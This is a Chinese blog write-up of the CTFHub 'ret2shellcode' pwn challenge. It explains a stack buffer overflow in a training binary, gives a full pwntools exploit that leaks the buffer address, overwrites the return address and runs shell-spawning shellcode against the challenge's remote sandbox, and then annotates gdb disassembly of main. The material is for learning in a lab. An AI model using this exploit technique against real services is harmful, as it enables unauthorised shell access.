# CTFHUB-PWN-ret2shellcode

[PWN常用命令_猫疼玩AI的博客-CSDN博客](https://blog.csdn.net/qq_41701054/article/details/123375057) 



## 1.做题方法

几个大方向的思路：  
没有PIE：ret2libc  
NX关闭：ret2shellcode  
其他思路：ret2csu、ret2text 【程序本身有shellcode】

先检查开了什么保护



<img src="https://i-blog.csdnimg.cn/blog_migrate/40c80893e0f4236ccb4af57e1afd3aa9.png" alt="" style="max-height:220px; box-sizing:content-box;" />


没有开保护 并且是64 的

放入ida64

查看字符串



<img src="https://i-blog.csdnimg.cn/blog_migrate/8c833d5559544d78d0fa4595c6282679.png" alt="" style="max-height:240px; box-sizing:content-box;" />


发现没有shell

我们看看主函数



<img src="https://i-blog.csdnimg.cn/blog_migrate/bd364f3c8711301b3d9ac3edd5690356.png" alt="" style="max-height:254px; box-sizing:content-box;" />


发现有read函数 但是没有shell

```cobol
并且 read 的大小为 400u   但是我们buf的大小只为 10h 所以说明是让我们写shellcode进去
```

我们现在要确定一些信息

## 1.buf的大小

大小为 0x10+0x08  因为是64位

## 2.shellcode的地址

我们要知道shellcode的地址 必须要知道 buf的地址 因为我们要把buf填充满 然后再让栈进入shellcode的地址 然后再执行shellcode

我们把shellcode_addr放在 buf_addr后面

buf_addr 是在程序执行的时候给我们的 %p是输出地址

所以我们使用pwntools 的 recvuntil()函数来取得

## 3.shellcode

使用pwntools中的

shellcode = asm(shellcraft.sh())即可

但是注意 64位要加上 context.arch='amd64'

```cobol
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
```

我们取得这些 我们就可以开始编写 exp

```cobol
from pwn import *
import re
context.arch='amd64'
shellcode=asm(shellcraft.sh())
p=remote('challenge-c3b38bfcad408f15.sandbox.ctfhub.com',33975)
buf_addr=p.recvuntil(']')  #截取到]为止的字符串
buf_addr=int(buf_addr[-15:-1],16)  #处理一下 然后为16进制
shellcode_addr=buf_addr+32   #0x10+0x08+0x08 十进制为32
payload=b'a'*(0x10+0x08)+p64(shellcode_addr)+shellcode
p.sendline(payload)
p.interactive()
```

运行



<img src="https://i-blog.csdnimg.cn/blog_migrate/f4cf5355854bb16a69b46aa90e2815bb.png" alt="" style="max-height:462px; box-sizing:content-box;" />




得到flag



<img src="https://i-blog.csdnimg.cn/blog_migrate/58cd86b5f20ec4a049ac6b8c78d1a536.png" alt="" style="max-height:143px; box-sizing:content-box;" />


最后晒出我自己理解的栈中的现象



<img src="https://i-blog.csdnimg.cn/blog_migrate/73db68eb0a1cb236ec7e52aa258a5ccc.png" alt="" style="max-height:641px; box-sizing:content-box;" />


## 2.开始解读栈内的方法 就是看gdb

```cobol
► 0x40060b <main+4>     sub    rsp, 0x10   #减法rsp-0x10 就是开辟空间
   0x40060f <main+8>     mov    qword ptr [rbp - 0x10], 0
把0 作为数值存入 rbp:0x10的地址
   0x400617 <main+16>    mov    qword ptr [rbp - 8], 0
把0 作为数值存入 rbp:8的地址
   0x40061f <main+24>    mov    rax, qword ptr [rip + 0x200a22] 
<stdout@@GLIBC_2.2.5>
把qword ptr [rip + 0x200a22]的地址存入rax寄存器中 
   0x400626 <main+31>    mov    ecx, 0
把0作为参数存入ecx 这里是作为 下面setvbuf的第二个参数
   0x40062b <main+36>    mov    edx, 1
同理
   0x400630 <main+41>    mov    esi, 0
同理
   0x400635 <main+46>    mov    rdi, rax
然后把rax存入rdi 就是上面的stdout流
   0x400638 <main+49>    call   setvbuf@plt                      <setvbuf@plt>
调用setvbuf函数
 
   0x40063d <main+54>    lea    rdi, [rip + 0xd4]
开始调用[rip + 0xd4]的地址指针存入rdi 作为puts的参数
   0x400644 <main+61>    call   puts@plt  
开始调用puts函数
 0x400649 <main+66>     lea    rax, [rbp - 0x10]
开始把[rbp:0x10]的地址指针存入rax
   0x40064d <main+70>     mov    rsi, rax
把rax的值存入rsi寄存器 作为下面print函数的参数
   0x400650 <main+73>     lea    rdi, [rip + 0xe2]
把[rip+0xe2]的指针存入rdi 这里是字符串常量的地址
   0x400657 <main+80>     mov    eax, 0
将eax调为0 表示没有浮点数
   0x40065c <main+85>     call   printf@plt                      <printf@plt>
 开始调用printf函数
 
 ► 0x400661 <main+90>     lea    rdi, [rip + 0xe6]
把[rip:0xe6]的地址存入rdi寄存器 作为puts函数的参数 也是字符串
   0x400668 <main+97>     call   puts@plt                      <puts@plt>
调用puts函数
   0x40066d <main+102>    lea    rax, [rbp - 0x10]
把[rbp-0x10]的地址存入rax寄存器 这里是取得 这个地址的东西
   0x400671 <main+106>    mov    edx, 0x400
然后把400h存入edx 表示打印可以输出的最大字节
   0x400676 <main+111>    mov    rsi, rax
把rax存入rsi寄存器 就是作为参数
   0x400679 <main+114>    mov    edi, 0
把edi设置为0 作为参数 
 0x40067e       <main+119>                      call   read@plt                      <read@plt>
执行 read函数
 
   0x400683       <main+124>                      mov    eax, 0
把0作为参数存入eax
   0x400688       <main+129>                      leave  
退出
   0x400689       <main+130>                      ret    
返回到返回地址
    ↓
   0x7ffff7c29d90 <__libc_start_call_main+128>    mov    edi, eax
把eax存入edi
 ► 0x7ffff7c29d92 <__libc_start_call_main+130>    call   exit                <exit>
        status: 0x0
 调用exit函数 退出到主函数
   0x7ffff7c29d97 <__libc_start_call_main+135>    call   __nptl_deallocate_tsd                <__nptl_deallocate_tsd>
调用这个函数
 
   0x7ffff7c29d9c <__libc_start_call_main+140>    lock dec dword ptr [rip + 0x1ef505]  <__nptl_nthreads>
   0x7ffff7c29da3 <__libc_start_call_main+147>    sete   al
   0x7ffff7c29da6 <__libc_start_call_main+150>    test   al, al
   0x7ffff7c29da8 <__libc_start_call_main+152>    jne    __libc_start_call_main+168                <__libc_start_call_main+168>
```

到此解释完毕

```undefined
执行函数前 先要调用寄存器 把函数的参数存入寄存器中 作为后面函数的参数
```